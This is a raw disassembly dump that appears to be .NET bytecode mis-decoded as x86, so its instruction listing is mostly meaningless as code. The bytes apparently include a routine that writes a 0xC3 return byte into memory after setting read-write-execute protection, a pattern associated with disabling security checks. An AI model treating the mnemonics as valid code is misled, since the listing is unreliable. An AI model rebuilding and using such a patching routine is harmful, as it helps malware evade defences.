  402b8a:	0a 28                	or     (%eax),%ch
  402b8c:	3c 00                	cmp    $0x0,%al
  402b8e:	00 0a                	add    %cl,(%edx)
  402b90:	2d 1c 11 0a 7e       	sub    $0x7e0a111c,%eax
  402b95:	34 00                	xor    $0x0,%al
  402b97:	00 0a                	add    %cl,(%edx)
  402b99:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  402b9c:	00 0a                	add    %cl,(%edx)
  402b9e:	2d 0e 11 0b 7e       	sub    $0x7e0b110e,%eax
  402ba3:	34 00                	xor    $0x0,%al
  402ba5:	00 0a                	add    %cl,(%edx)
  402ba7:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  402baa:	00 0a                	add    %cl,(%edx)
  402bac:	2c 02                	sub    $0x2,%al
  402bae:	16                   	push   %ss
  402baf:	2a 11                	sub    (%ecx),%dl
  402bb1:	0a d0                	or     %al,%dl
  402bb3:	13 00                	adc    (%eax),%eax
  402bb5:	00 02                	add    %al,(%edx)
  402bb7:	28 1a                	sub    %bl,(%edx)
  402bb9:	00 00                	add    %al,(%eax)
  402bbb:	0a 28                	or     (%eax),%ch
  402bbd:	36 00 00             	add    %al,%ss:(%eax)
  402bc0:	0a 74 13 00          	or     0x0(%ebx,%edx,1),%dh
  402bc4:	00 02                	add    %al,(%edx)
  402bc6:	11 0b                	adc    %ecx,(%ebx)
  402bc8:	d0 14 00             	rclb   $1,(%eax,%eax,1)
  402bcb:	00 02                	add    %al,(%edx)
  402bcd:	28 1a                	sub    %bl,(%edx)
  402bcf:	00 00                	add    %al,(%eax)
  402bd1:	0a 28                	or     (%eax),%ch
  402bd3:	36 00 00             	add    %al,%ss:(%eax)
  402bd6:	0a 74 14 00          	or     0x0(%esp,%edx,1),%dh
  402bda:	00 02                	add    %al,(%edx)
  402bdc:	13 0d 11 09 d0 0b    	adc    0xbd00911,%ecx
  402be2:	00 00                	add    %al,(%eax)
  402be4:	02 28                	add    (%eax),%ch
  402be6:	1a 00                	sbb    (%eax),%al
  402be8:	00 0a                	add    %cl,(%edx)
  402bea:	28 36                	sub    %dh,(%esi)
  402bec:	00 00                	add    %al,(%eax)
  402bee:	0a 74 0b 00          	or     0x0(%ebx,%ecx,1),%dh
  402bf2:	00 02                	add    %al,(%edx)
  402bf4:	13 0e                	adc    (%esi),%ecx
  402bf6:	11 05 03 16 11 06    	adc    %eax,0x6111603
  402bfc:	12 0c 6f             	adc    (%edi,%ebp,2),%cl
  402bff:	48                   	dec    %eax
  402c00:	00 00                	add    %al,(%eax)
  402c02:	06                   	push   %es
  402c03:	2c 02                	sub    $0x2,%al
  402c05:	16                   	push   %ss
  402c06:	2a 00                	sub    (%eax),%al
  402c08:	28 3f                	sub    %bh,(%edi)
  402c0a:	00 00                	add    %al,(%eax)
  402c0c:	0a 13                	or     (%ebx),%dl
  402c0e:	19 12                	sbb    %edx,(%edx)
  402c10:	19 72 2d             	sbb    %esi,0x2d(%edx)
  402c13:	04 00                	add    $0x0,%al
  402c15:	70 28                	jo     0x402c3f
  402c17:	40                   	inc    %eax
  402c18:	00 00                	add    %al,(%eax)
  402c1a:	0a 16                	or     (%esi),%dl
  402c1c:	1c 6f                	sbb    $0x6f,%al
  402c1e:	41                   	inc    %ecx
  402c1f:	00 00                	add    %al,(%eax)
  402c21:	0a 13                	or     (%ebx),%dl
  402c23:	0f 72                	pslld  $0x72,(bad)
  402c25:	31 04 00             	xor    %eax,(%eax,%eax,1)
  402c28:	70 13                	jo     0x402c3d
  402c2a:	10 28                	adc    %ch,(%eax)
  402c2c:	42                   	inc    %edx
  402c2d:	00 00                	add    %al,(%eax)
  402c2f:	0a 11                	or     (%ecx),%dl
  402c31:	0f 6f 43 00          	movq   0x0(%ebx),%mm0
  402c35:	00 0a                	add    %cl,(%edx)
  402c37:	13 11                	adc    (%ecx),%edx
  402c39:	18 8d 45 00 00 01    	sbb    %cl,0x1000045(%ebp)
  402c3f:	13 12                	adc    (%edx),%edx
  402c41:	28 42 00             	sub    %al,0x0(%edx)
  402c44:	00 0a                	add    %cl,(%edx)
  402c46:	11 10                	adc    %edx,(%eax)
  402c48:	6f                   	outsl  %ds:(%esi),(%dx)
  402c49:	43                   	inc    %ebx
  402c4a:	00 00                	add    %al,(%eax)
  402c4c:	0a 13                	or     (%ebx),%dl
  402c4e:	13 11                	adc    (%ecx),%edx
  402c50:	11 8e 69 11 12 8e    	adc    %ecx,-0x71edee97(%esi)
  402c56:	69 58 11 13 8e 69 58 	imul   $0x58698e13,0x11(%eax),%ebx
  402c5d:	8d 45 00             	lea    0x0(%ebp),%eax
  402c60:	00 01                	add    %al,(%ecx)
  402c62:	13 14 11             	adc    (%ecx,%edx,1),%edx
  402c65:	11 16                	adc    %edx,(%esi)
  402c67:	11 14 16             	adc    %edx,(%esi,%edx,1)
  402c6a:	11 11                	adc    %edx,(%ecx)
  402c6c:	8e 69 28             	mov    0x28(%ecx),%gs
  402c6f:	44                   	inc    %esp
  402c70:	00 00                	add    %al,(%eax)
  402c72:	0a 11                	or     (%ecx),%dl
  402c74:	12 16                	adc    (%esi),%dl
  402c76:	11 14 11             	adc    %edx,(%ecx,%edx,1)
  402c79:	11 8e 69 11 12 8e    	adc    %ecx,-0x71edee97(%esi)
  402c7f:	69 28 44 00 00 0a    	imul   $0xa000044,(%eax),%ebp
  402c85:	11 13                	adc    %edx,(%ebx)
  402c87:	16                   	push   %ss
  402c88:	11 14 11             	adc    %edx,(%ecx,%edx,1)
  402c8b:	11 8e 69 11 12 8e    	adc    %ecx,-0x71edee97(%esi)
  402c91:	69 58 11 13 8e 69 28 	imul   $0x28698e13,0x11(%eax),%ebx
  402c98:	44                   	inc    %esp
  402c99:	00 00                	add    %al,(%eax)
  402c9b:	0a 11                	or     (%ecx),%dl
  402c9d:	14 8e                	adc    $0x8e,%al
  402c9f:	69 28 45 00 00 0a    	imul   $0xa000045,(%eax),%ebp
  402ca5:	13 15 11 14 16 11    	adc    0x11161411,%edx
  402cab:	15 11 14 8e 69       	adc    $0x698e1411,%eax
  402cb0:	28 46 00             	sub    %al,0x0(%esi)
  402cb3:	00 0a                	add    %cl,(%edx)
  402cb5:	12 1a                	adc    (%edx),%bl
  402cb7:	fe                   	(bad)
  402cb8:	15 0a 00 00 02       	adc    $0x200000a,%eax
  402cbd:	12 1a                	adc    (%edx),%bl
  402cbf:	11 14 8e             	adc    %edx,(%esi,%ecx,4)
  402cc2:	69 d1 7d 24 00 00    	imul   $0x247d,%ecx,%edx
  402cc8:	04 12                	add    $0x12,%al
  402cca:	1a 11                	sbb    (%ecx),%dl
  402ccc:	14 8e                	adc    $0x8e,%al
  402cce:	69 d1 7d 25 00 00    	imul   $0x257d,%ecx,%edx
  402cd4:	04 12                	add    $0x12,%al
  402cd6:	1a 11                	sbb    (%ecx),%dl
  402cd8:	15 7d 26 00 00       	adc    $0x267d,%eax
  402cdd:	04 11                	add    $0x11,%al
  402cdf:	1a 13                	sbb    (%ebx),%dl
  402ce1:	16                   	push   %ss
  402ce2:	28 42 00             	sub    %al,0x0(%edx)
  402ce5:	00 0a                	add    %cl,(%edx)
  402ce7:	02 72 45             	add    0x45(%edx),%dh
  402cea:	04 00                	add    $0x0,%al
  402cec:	70 28                	jo     0x402d16
  402cee:	47                   	inc    %edi
  402cef:	00 00                	add    %al,(%eax)
  402cf1:	0a 6f 43             	or     0x43(%edi),%ch
  402cf4:	00 00                	add    %al,(%eax)
  402cf6:	0a 13                	or     (%ebx),%dl
  402cf8:	17                   	pop    %ss
  402cf9:	11 17                	adc    %edx,(%edi)
  402cfb:	8e 69 28             	mov    0x28(%ecx),%gs
  402cfe:	45                   	inc    %ebp
  402cff:	00 00                	add    %al,(%eax)
  402d01:	0a 13                	or     (%ebx),%dl
  402d03:	18 11                	sbb    %dl,(%ecx)
  402d05:	17                   	pop    %ss
  402d06:	16                   	push   %ss
  402d07:	11 18                	adc    %ebx,(%eax)
  402d09:	11 17                	adc    %edx,(%edi)
  402d0b:	8e 69 28             	mov    0x28(%ecx),%gs
  402d0e:	46                   	inc    %esi
  402d0f:	00 00                	add    %al,(%eax)
  402d11:	0a 11                	or     (%ecx),%dl
  402d13:	0e                   	push   %cs
  402d14:	11 0c 12             	adc    %ecx,(%edx,%edx,1)
  402d17:	16                   	push   %ss
  402d18:	16                   	push   %ss
  402d19:	17                   	pop    %ss
  402d1a:	11 18                	adc    %ebx,(%eax)
  402d1c:	11 17                	adc    %edx,(%edi)
  402d1e:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402d21:	28 00                	sub    %al,(%eax)
  402d23:	00 06                	add    %al,(%esi)
  402d25:	11 15 28 48 00 00    	adc    %edx,0x4828
  402d2b:	0a 11                	or     (%ecx),%dl
  402d2d:	18 28                	sbb    %ch,(%eax)
  402d2f:	48                   	dec    %eax
  402d30:	00 00                	add    %al,(%eax)
  402d32:	0a 16                	or     (%esi),%dl
  402d34:	fe 01                	incb   (%ecx)
  402d36:	13 1b                	adc    (%ebx),%ebx
  402d38:	de 0b                	fimuls (%ebx)
  402d3a:	11 0d 11 0c 6f 4c    	adc    %ecx,0x4c6f0c11
  402d40:	00 00                	add    %al,(%eax)
  402d42:	06                   	push   %es
  402d43:	26 dc 11             	fcoml  %es:(%ecx)
  402d46:	1b 2a                	sbb    (%edx),%ebp
  402d48:	41                   	inc    %ecx
  402d49:	1c 00                	sbb    $0x0,%al
  402d4b:	00 02                	add    %al,(%edx)
  402d4d:	00 00                	add    %al,(%eax)
  402d4f:	00 58 01             	add    %bl,0x1(%eax)
  402d52:	00 00                	add    %al,(%eax)
  402d54:	32 01                	xor    (%ecx),%al
  402d56:	00 00                	add    %al,(%eax)
  402d58:	8a 02                	mov    (%edx),%al
  402d5a:	00 00                	add    %al,(%eax)
  402d5c:	0b 00                	or     (%eax),%eax
  402d5e:	00 00                	add    %al,(%eax)
  402d60:	00 00                	add    %al,(%eax)
  402d62:	00 00                	add    %al,(%eax)
  402d64:	1b 30                	sbb    (%eax),%esi
  402d66:	02 00                	add    (%eax),%al
  402d68:	19 00                	sbb    %eax,(%eax)
  402d6a:	00 00                	add    %al,(%eax)
  402d6c:	09 00                	or     %eax,(%eax)
  402d6e:	00 11                	add    %dl,(%ecx)
  402d70:	02 28                	add    (%eax),%ch
  402d72:	49                   	dec    %ecx
  402d73:	00 00                	add    %al,(%eax)
  402d75:	0a 28                	or     (%eax),%ch
  402d77:	4a                   	dec    %edx
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	0a 8e 16 fe 03 0a    	or     0xa03fe16(%esi),%cl
  402d80:	de 05 26 16 0a de    	fiadds 0xde0a1626
  402d86:	00 06                	add    %al,(%esi)
  402d88:	2a 00                	sub    (%eax),%al
  402d8a:	00 00                	add    %al,(%eax)
  402d8c:	01 10                	add    %edx,(%eax)
  402d8e:	00 00                	add    %al,(%eax)
  402d90:	00 00                	add    %al,(%eax)
  402d92:	00 00                	add    %al,(%eax)
  402d94:	12 12                	adc    (%edx),%dl
  402d96:	00 05 11 00 00 01    	add    %al,0x1000011
  402d9c:	1b 30                	sbb    (%eax),%esi
  402d9e:	05 00 b6 02 00       	add    $0x2b600,%eax
  402da3:	00 0a                	add    %cl,(%edx)
  402da5:	00 00                	add    %al,(%eax)
  402da7:	11 7e 01             	adc    %edi,0x1(%esi)
  402daa:	00 00                	add    %al,(%eax)
  402dac:	04 2c                	add    $0x2c,%al
  402dae:	01 2a                	add    %ebp,(%edx)
  402db0:	17                   	pop    %ss
  402db1:	80 01 00             	addb   $0x0,(%ecx)
  402db4:	00 04 28             	add    %al,(%eax,%ebp,1)
  402db7:	03 00                	add    (%eax),%eax
  402db9:	00 06                	add    %al,(%esi)
  402dbb:	20 f7                	and    %dh,%bh
  402dbd:	00 00                	add    %al,(%eax)
  402dbf:	00 0a                	add    %cl,(%edx)
  402dc1:	72 49                	jb     0x402e0c
  402dc3:	04 00                	add    $0x0,%al
  402dc5:	70 06                	jo     0x402dcd
  402dc7:	28 05 00 00 06 28    	sub    %al,0x28060000
  402dcd:	09 00                	or     %eax,(%eax)
  402dcf:	00 06                	add    %al,(%esi)
  402dd1:	13 08                	adc    (%eax),%ecx
  402dd3:	11 08                	adc    %ecx,(%eax)
  402dd5:	7e 34                	jle    0x402e0b
  402dd7:	00 00                	add    %al,(%eax)
  402dd9:	0a 28                	or     (%eax),%ch
  402ddb:	35 00 00 0a 39       	xor    $0x390a0000,%eax
  402de0:	b5 00                	mov    $0x0,%ch
  402de2:	00 00                	add    %al,(%eax)
  402de4:	11 08                	adc    %ecx,(%eax)
  402de6:	72 63                	jb     0x402e4b
  402de8:	04 00                	add    $0x0,%al
  402dea:	70 06                	jo     0x402df2
  402dec:	28 05 00 00 06 28    	sub    %al,0x28060000
  402df2:	07                   	pop    %es
  402df3:	00 00                	add    %al,(%eax)
  402df5:	06                   	push   %es
  402df6:	13 09                	adc    (%ecx),%ecx
  402df8:	11 09                	adc    %ecx,(%ecx)
  402dfa:	7e 34                	jle    0x402e30
  402dfc:	00 00                	add    %al,(%eax)
  402dfe:	0a 28                	or     (%eax),%ch
  402e00:	35 00 00 0a 39       	xor    $0x390a0000,%eax
  402e05:	90                   	nop
  402e06:	00 00                	add    %al,(%eax)
  402e08:	00 72 a9             	add    %dh,-0x57(%edx)
  402e0b:	01 00                	add    %eax,(%eax)
  402e0d:	70 06                	jo     0x402e15
  402e0f:	28 05 00 00 06 28    	sub    %al,0x28060000
  402e15:	08 00                	or     %al,(%eax)
  402e17:	00 06                	add    %al,(%esi)
  402e19:	72 8d                	jb     0x402da8
  402e1b:	04 00                	add    $0x0,%al
  402e1d:	70 06                	jo     0x402e25
  402e1f:	28 05 00 00 06 28    	sub    %al,0x28060000
  402e25:	07                   	pop    %es
  402e26:	00 00                	add    %al,(%eax)
  402e28:	06                   	push   %es
  402e29:	13 0a                	adc    (%edx),%ecx
  402e2b:	11 0a                	adc    %ecx,(%edx)
  402e2d:	7e 34                	jle    0x402e63
  402e2f:	00 00                	add    %al,(%eax)
  402e31:	0a 28                	or     (%eax),%ch
  402e33:	35 00 00 0a 2c       	xor    $0x2c0a0000,%eax
  402e38:	60                   	pusha
  402e39:	11 0a                	adc    %ecx,(%edx)
  402e3b:	d0 16                	rclb   $1,(%esi)
  402e3d:	00 00                	add    %al,(%eax)
  402e3f:	02 28                	add    (%eax),%ch
  402e41:	1a 00                	sbb    (%eax),%al
  402e43:	00 0a                	add    %cl,(%edx)
  402e45:	28 36                	sub    %dh,(%esi)
  402e47:	00 00                	add    %al,(%eax)
  402e49:	0a 74 16 00          	or     0x0(%esi,%edx,1),%dh
  402e4d:	00 02                	add    %al,(%edx)
  402e4f:	13 0b                	adc    (%ebx),%ecx
  402e51:	72 b7                	jb     0x402e0a
  402e53:	04 00                	add    $0x0,%al
  402e55:	70 06                	jo     0x402e5d
  402e57:	28 04 00             	sub    %al,(%eax,%eax,1)
  402e5a:	00 06                	add    %al,(%esi)
  402e5c:	13 0d 11 0d 8e 69    	adc    0x698e0d11,%ecx
  402e62:	6a 28                	push   $0x28
  402e64:	4b                   	dec    %ebx
  402e65:	00 00                	add    %al,(%eax)
  402e67:	0a 13                	or     (%ebx),%dl
  402e69:	0e                   	push   %cs
  402e6a:	11 0b                	adc    %ecx,(%ebx)
  402e6c:	11 09                	adc    %ecx,(%ecx)
  402e6e:	11 0e                	adc    %ecx,(%esi)
  402e70:	1f                   	pop    %ds
  402e71:	40                   	inc    %eax
  402e72:	12 0c 6f             	adc    (%edi,%ebp,2),%cl
  402e75:	54                   	push   %esp
  402e76:	00 00                	add    %al,(%eax)
  402e78:	06                   	push   %es
  402e79:	2c 1e                	sub    $0x1e,%al
  402e7b:	11 0d 16 11 09 11    	adc    %ecx,0x11091116
  402e81:	0d 8e 69 28 46       	or     $0x4628698e,%eax
  402e86:	00 00                	add    %al,(%eax)
  402e88:	0a 11                	or     (%ecx),%dl
  402e8a:	0b 11                	or     (%ecx),%edx
  402e8c:	09 11                	or     %edx,(%ecx)
  402e8e:	0e                   	push   %cs
  402e8f:	11 0c 12             	adc    %ecx,(%edx,%edx,1)
  402e92:	0c 6f                	or     $0x6f,%al
  402e94:	54                   	push   %esp
  402e95:	00 00                	add    %al,(%eax)
  402e97:	06                   	push   %es
  402e98:	26 de 03             	fiadds %es:(%ebx)
  402e9b:	26 de 00             	fiadds %es:(%eax)
  402e9e:	00 72 35             	add    %dh,0x35(%edx)
  402ea1:	03 00                	add    (%eax),%eax
  402ea3:	70 06                	jo     0x402eab
  402ea5:	28 05 00 00 06 28    	sub    %al,0x28060000
  402eab:	09 00                	or     %eax,(%eax)
  402ead:	00 06                	add    %al,(%esi)
  402eaf:	13 0f                	adc    (%edi),%ecx
  402eb1:	11 0f                	adc    %ecx,(%edi)
  402eb3:	7e 34                	jle    0x402ee9
  402eb5:	00 00                	add    %al,(%eax)
  402eb7:	0a 28                	or     (%eax),%ch
  402eb9:	35 00 00 0a 39       	xor    $0x390a0000,%eax
  402ebe:	b8 00 00 00 11       	mov    $0x11000000,%eax
  402ec3:	0f 72                	(bad)
  402ec5:	c1 04 00 70          	roll   $0x70,(%eax,%eax,1)
  402ec9:	06                   	push   %es
  402eca:	28 05 00 00 06 28    	sub    %al,0x28060000
  402ed0:	07                   	pop    %es
  402ed1:	00 00                	add    %al,(%eax)
  402ed3:	06                   	push   %es
  402ed4:	13 10                	adc    (%eax),%edx
  402ed6:	11 10                	adc    %edx,(%eax)
  402ed8:	7e 34                	jle    0x402f0e
  402eda:	00 00                	add    %al,(%eax)
  402edc:	0a 28                	or     (%eax),%ch
  402ede:	35 00 00 0a 39       	xor    $0x390a0000,%eax
  402ee3:	93                   	xchg   %eax,%ebx
  402ee4:	00 00                	add    %al,(%eax)
  402ee6:	00 72 a9             	add    %dh,-0x57(%edx)
  402ee9:	01 00                	add    %eax,(%eax)
  402eeb:	70 06                	jo     0x402ef3
  402eed:	28 05 00 00 06 28    	sub    %al,0x28060000
  402ef3:	08 00                	or     %al,(%eax)
  402ef5:	00 06                	add    %al,(%esi)
  402ef7:	72 8d                	jb     0x402e86
  402ef9:	04 00                	add    $0x0,%al
  402efb:	70 06                	jo     0x402f03
  402efd:	28 05 00 00 06 28    	sub    %al,0x28060000
  402f03:	07                   	pop    %es
  402f04:	00 00                	add    %al,(%eax)
  402f06:	06                   	push   %es
  402f07:	13 11                	adc    (%ecx),%edx
  402f09:	11 11                	adc    %edx,(%ecx)
  402f0b:	7e 34                	jle    0x402f41
  402f0d:	00 00                	add    %al,(%eax)
  402f0f:	0a 28                	or     (%eax),%ch
  402f11:	35 00 00 0a 2c       	xor    $0x2c0a0000,%eax
  402f16:	63 11                	arpl   %edx,(%ecx)
  402f18:	11 d0                	adc    %edx,%eax
  402f1a:	16                   	push   %ss
  402f1b:	00 00                	add    %al,(%eax)
  402f1d:	02 28                	add    (%eax),%ch
  402f1f:	1a 00                	sbb    (%eax),%al
  402f21:	00 0a                	add    %cl,(%edx)
  402f23:	28 36                	sub    %dh,(%esi)
  402f25:	00 00                	add    %al,(%eax)
  402f27:	0a 74 16 00          	or     0x0(%esi,%edx,1),%dh
  402f2b:	00 02                	add    %al,(%edx)
  402f2d:	13 12                	adc    (%edx),%edx
  402f2f:	17                   	pop    %ss
  402f30:	8d 45 00             	lea    0x0(%ebp),%eax
  402f33:	00 01                	add    %al,(%ecx)
  402f35:	25 16 20 c3 00       	and    $0xc32016,%eax
  402f3a:	00 00                	add    %al,(%eax)
  402f3c:	9c                   	pushf
  402f3d:	13 14 11             	adc    (%ecx,%edx,1),%edx
  402f40:	14 8e                	adc    $0x8e,%al
  402f42:	69 6a 28 4b 00 00 0a 	imul   $0xa00004b,0x28(%edx),%ebp
  402f49:	13 15 11 12 11 10    	adc    0x10111211,%edx
  402f4f:	11 15 1f 40 12 13    	adc    %edx,0x1312401f
  402f55:	6f                   	outsl  %ds:(%esi),(%dx)
  402f56:	54                   	push   %esp
  402f57:	00 00                	add    %al,(%eax)
  402f59:	06                   	push   %es
  402f5a:	2c 1e                	sub    $0x1e,%al
  402f5c:	11 14 16             	adc    %edx,(%esi,%edx,1)
  402f5f:	11 10                	adc    %edx,(%eax)
  402f61:	11 14 8e             	adc    %edx,(%esi,%ecx,4)
  402f64:	69 28 46 00 00 0a    	imul   $0xa000046,(%eax),%ebp
  402f6a:	11 12                	adc    %edx,(%edx)
  402f6c:	11 10                	adc    %edx,(%eax)
  402f6e:	11 15 11 13 12 13    	adc    %edx,0x13121311
  402f74:	6f                   	outsl  %ds:(%esi),(%dx)
  402f75:	54                   	push   %esp
  402f76:	00 00                	add    %al,(%eax)
  402f78:	06                   	push   %es
  402f79:	26 de 03             	fiadds %es:(%ebx)
  402f7c:	26 de 00             	fiadds %es:(%eax)
  402f7f:	72 eb                	jb     0x402f6c
  402f81:	04 00                	add    $0x0,%al
  402f83:	70 06                	jo     0x402f8b
  402f85:	28 05 00 00 06 0b    	sub    %al,0xb060000
  402f8b:	72 05                	jb     0x402f92
  402f8d:	05 00 70 06 28       	add    $0x28067000,%eax
  402f92:	05 00 00 06 0c       	add    $0xc060000,%eax
  402f97:	72 27                	jb     0x402fc0
  402f99:	05 00 70 06 28       	add    $0x28067000,%eax
  402f9e:	05 00 00 06 0d       	add    $0xd060000,%eax
  402fa3:	72 a5                	jb     0x402f4a
  402fa5:	02 00                	add    (%eax),%al
  402fa7:	70 06                	jo     0x402faf
  402fa9:	28 06                	sub    %al,(%esi)
  402fab:	00 00                	add    %al,(%eax)
  402fad:	06                   	push   %es
  402fae:	13 04 1f             	adc    (%edi,%ebx,1),%eax
  402fb1:	1a 28                	sbb    (%eax),%ch
  402fb3:	4c                   	dec    %esp
  402fb4:	00 00                	add    %al,(%eax)
  402fb6:	0a 07                	or     (%edi),%al
  402fb8:	28 4d 00             	sub    %cl,0x0(%ebp)
  402fbb:	00 0a                	add    %cl,(%edx)
  402fbd:	13 05 11 05 08 72    	adc    0x72080511,%eax
  402fc3:	a1 05 00 70 72       	mov    0x72700005,%eax
  402fc8:	ab                   	stos   %eax,%es:(%edi)
  402fc9:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  402fce:	00 00                	add    %al,(%eax)
  402fd0:	0a 28                	or     (%eax),%ch
  402fd2:	4d                   	dec    %ebp
  402fd3:	00 00                	add    %al,(%eax)
  402fd5:	0a 13                	or     (%ebx),%dl
  402fd7:	06                   	push   %es
  402fd8:	11 05 08 28 4d 00    	adc    %eax,0x4d2808
  402fde:	00 0a                	add    %cl,(%edx)
  402fe0:	13 07                	adc    (%edi),%eax
  402fe2:	11 07                	adc    %eax,(%edi)
  402fe4:	28 4f 00             	sub    %cl,0x0(%edi)
  402fe7:	00 0a                	add    %cl,(%edx)
  402fe9:	2d 61 72 b5 05       	sub    $0x5b57261,%eax
  402fee:	00 70 06             	add    %dh,0x6(%eax)
  402ff1:	28 04 00             	sub    %al,(%eax,%eax,1)
  402ff4:	00 06                	add    %al,(%esi)
  402ff6:	13 16                	adc    (%esi),%edx
  402ff8:	11 05 28 0c 00 00    	adc    %eax,0xc28
  402ffe:	06                   	push   %es
  402fff:	26 11 06             	adc    %eax,%es:(%esi)
  403002:	11 16                	adc    %edx,(%esi)
  403004:	28 0b                	sub    %cl,(%ebx)
  403006:	00 00                	add    %al,(%eax)
  403008:	06                   	push   %es
  403009:	26 11 06             	adc    %eax,%es:(%esi)
  40300c:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  40300f:	0e                   	push   %cs
  403010:	00 00                	add    %al,(%eax)
  403012:	06                   	push   %es
  403013:	26 11 06             	adc    %eax,%es:(%esi)
  403016:	11 07                	adc    %eax,(%edi)
  403018:	28 0d 00 00 06 26    	sub    %cl,0x26060000
  40301e:	11 07                	adc    %eax,(%edi)
  403020:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  403023:	0e                   	push   %cs
  403024:	00 00                	add    %al,(%eax)
  403026:	06                   	push   %es
  403027:	26 11 05 11 04 28 0e 	adc    %eax,%es:0xe280411
  40302e:	00 00                	add    %al,(%eax)
  403030:	06                   	push   %es
  403031:	26 73 50             	es jae 0x403084
  403034:	00 00                	add    %al,(%eax)
  403036:	0a 17                	or     (%edi),%dl
  403038:	19 6f 51             	sbb    %ebp,0x51(%edi)
  40303b:	00 00                	add    %al,(%eax)
  40303d:	0a 28                	or     (%eax),%ch
  40303f:	0f 00 00             	sldt   (%eax)
  403042:	06                   	push   %es
  403043:	11 07                	adc    %eax,(%edi)
  403045:	09 28                	or     %ebp,(%eax)
  403047:	10 00                	adc    %al,(%eax)
  403049:	00 06                	add    %al,(%esi)
  40304b:	26 11 07             	adc    %eax,%es:(%edi)
  40304e:	28 11                	sub    %dl,(%ecx)
  403050:	00 00                	add    %al,(%eax)
  403052:	06                   	push   %es
  403053:	2c 01                	sub    $0x1,%al
  403055:	2a 11                	sub    (%ecx),%dl
  403057:	07                   	pop    %es
  403058:	28 0a                	sub    %cl,(%edx)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	06                   	push   %es
  40305d:	2a 00                	sub    (%eax),%al
  40305f:	00 01                	add    %al,(%ecx)
  403061:	1c 00                	sbb    $0x0,%al
  403063:	00 00                	add    %al,(%eax)
  403065:	00 19                	add    %bl,(%ecx)
  403067:	00 da                	add    %bl,%dl
  403069:	f3 00 03             	repz add %al,(%ebx)
  40306c:	11 00                	adc    %eax,(%eax)
  40306e:	00 01                	add    %al,(%ecx)
  403070:	00 00                	add    %al,(%eax)
  403072:	f7 00 dd d4 01 03    	testl  $0x301d4dd,(%eax)
  403078:	11 00                	adc    %eax,(%eax)
  40307a:	00 01                	add    %al,(%ecx)
  40307c:	4a                   	dec    %edx
  40307d:	02 72 6a             	add    0x6a(%edx),%dh
  403080:	70 00                	jo     0x403082
  403082:	70 18                	jo     0x40309c
  403084:	73 52                	jae    0x4030d8
  403086:	00 00                	add    %al,(%eax)
  403088:	0a 28                	or     (%eax),%ch
  40308a:	53                   	push   %ebx
  40308b:	00 00                	add    %al,(%eax)
  40308d:	0a 2a                	or     (%edx),%ch
  40308f:	4a                   	dec    %edx
  403090:	73 15                	jae    0x4030a7
  403092:	00 00                	add    %al,(%eax)
  403094:	06                   	push   %es
  403095:	25 6f 13 00 00       	and    $0x136f,%eax
  40309a:	06                   	push   %es
  40309b:	6f                   	outsl  %ds:(%esi),(%dx)
  40309c:	54                   	push   %esp
  40309d:	00 00                	add    %al,(%eax)
  40309f:	0a 26                	or     (%esi),%ah
  4030a1:	2a 1e                	sub    (%esi),%bl
  4030a3:	02 28                	add    (%eax),%ch
  4030a5:	55                   	push   %ebp
  4030a6:	00 00                	add    %al,(%eax)
  4030a8:	0a 2a                	or     (%edx),%ch
  4030aa:	36 02 28             	add    %ss:(%eax),%ch
  4030ad:	56                   	push   %esi
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	0a 02                	or     (%edx),%al
  4030b2:	28 1a                	sub    %bl,(%edx)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	06                   	push   %es
  4030b7:	2a 1b                	sub    (%ebx),%bl
  4030b9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4030bc:	30 01                	xor    %al,(%ecx)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	0b 00                	or     (%eax),%eax
  4030c2:	00 11                	add    %dl,(%ecx)
  4030c4:	02 7b 02             	add    0x2(%ebx),%bh
  4030c7:	00 00                	add    %al,(%eax)
  4030c9:	04 6f                	add    $0x6f,%al
  4030cb:	57                   	push   %edi
  4030cc:	00 00                	add    %al,(%eax)
  4030ce:	0a 13                	or     (%ebx),%dl
  4030d0:	05 12 05 28 58       	add    $0x58280512,%eax
  4030d5:	00 00                	add    %al,(%eax)
  4030d7:	0a 2c 0e             	or     (%esi,%ecx,1),%ch
  4030da:	72 8a                	jb     0x403066
  4030dc:	70 00                	jo     0x4030de
  4030de:	70 0a                	jo     0x4030ea
  4030e0:	72 13                	jb     0x4030f5
  4030e2:	71 00                	jno    0x4030e4
  4030e4:	70 0b                	jo     0x4030f1
  4030e6:	2b 30                	sub    (%eax),%esi
  4030e8:	02 7b 03             	add    0x3(%ebx),%bh
  4030eb:	00 00                	add    %al,(%eax)
  4030ed:	04 6f                	add    $0x6f,%al
  4030ef:	57                   	push   %edi
  4030f0:	00 00                	add    %al,(%eax)
  4030f2:	0a 13                	or     (%ebx),%dl
  4030f4:	05 12 05 28 58       	add    $0x58280512,%eax
  4030f9:	00 00                	add    %al,(%eax)
  4030fb:	0a 2c 0e             	or     (%esi,%ecx,1),%ch
  4030fe:	72 59                	jb     0x403159
  403100:	71 00                	jno    0x403102
  403102:	70 0a                	jo     0x40310e
  403104:	72 de                	jb     0x4030e4
  403106:	71 00                	jno    0x403108
  403108:	70 0b                	jo     0x403115
  40310a:	2b 0c 72             	sub    (%edx,%esi,2),%ecx
  40310d:	1e                   	push   %ds
  40310e:	72 00                	jb     0x403110
  403110:	70 0a                	jo     0x40311c
  403112:	72 a3                	jb     0x4030b7
  403114:	72 00                	jb     0x403116
  403116:	70 0b                	jo     0x403123
  403118:	72 df                	jb     0x4030f9
  40311a:	72 00                	jb     0x40311c
  40311c:	70 0c                	jo     0x40312a
  40311e:	02 7b 05             	add    0x5(%ebx),%bh
  403121:	00 00                	add    %al,(%eax)
  403123:	04 6f                	add    $0x6f,%al
  403125:	59                   	pop    %ecx
  403126:	00 00                	add    %al,(%eax)
  403128:	0a 75 53             	or     0x53(%ebp),%dh
  40312b:	00 00                	add    %al,(%eax)
  40312d:	01 25 2d 04 26 14    	add    %esp,0x1426042d
  403133:	2b 11                	sub    (%ecx),%edx
  403135:	28 5a 00             	sub    %bl,0x0(%edx)
  403138:	00 0a                	add    %cl,(%edx)
